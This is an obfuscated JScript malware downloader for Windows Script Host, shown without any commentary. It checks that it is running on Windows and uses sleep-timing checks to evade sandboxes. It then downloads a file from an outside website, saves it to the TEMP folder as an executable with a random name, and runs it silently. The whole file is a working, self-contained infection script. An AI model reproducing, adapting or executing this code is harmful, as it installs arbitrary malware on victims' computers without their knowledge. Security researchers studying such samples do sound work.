var WF = false;
var pe = "CreateObject";
var y0 = function Ho() {return WScript[pe]("WScript.Shell");}(), h = 11;
var kx = "MSXML2.XMLHTTP";
var W = 2123213;
var I = 0;
function d(hv){y0["Run"](hv, I, I);};
function Y(){return "" + kx;};
function An(yO, eW){I = I * 1; return yO - eW;};
function x(){return pe;};
/*@cc_on
  @if (@_win32 || @_win64)
    WF = true;
  @end
@*/
if (WF)
{
var JZ = "";
function y(){return 22;};
var Vs = 0; var qu = 0;
function en()
{
var AQ = new this["Date"]();
var i0 = AQ["getUTCMilliseconds"]();
WScript["Sleep"](y());
var AQ = new this["Date"]();
var i = AQ["getUTCMilliseconds"]();
WScript["Sleep"](y());
var AQ = new this["Date"]();
var Kk = AQ["getUTCMilliseconds"]();
var Vs = "Z";
Vs = An(i, i0);
var qu = "v";
qu = An(Kk, i);
JZ = "open";
return An(Vs, qu);
}
var k = false;
var cd = false;
for (var eF = I; eF < y() * 1; eF++){if (en() != I){
k = true; 
qu = "31" + 11 * Vs + qu; 
cd = true; 
break;
}}
function T() {return ((k == true) && (k == cd)) ? 1 : I;};
if (k && T() && cd){
function F() {return y0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "oXcguMG8ewhLXZHF.exe";};
 DM = Y();
 vL = WScript[pe](DM);
 var oD = 1;
 while (oD){
try {
vL[JZ]("GET", "http://pasticceriabonci.it/m1psa", false);
vL["send"]();
z = "Sleep";
for (;;){WScript[z](y() * 11); if (vL["readystate"] >= 2 * 2) break;};
oD = I;
} catch(EN){};
}
function Gy(D) {var X = (1, 2, 3, 4, 5, D); return X;};
F0 = WScript[x()]("ADODB.Stream");
DM = F0;
DM[JZ]();
DM["type"] = Gy(1);
DM["write"](vL["ResponseBody"]);
F0["position"] = Gy(I);
DM["Save" + "ToFile"](F(), 2);
F0["c"+"lose"]();
az = F();
d(az);
}
}

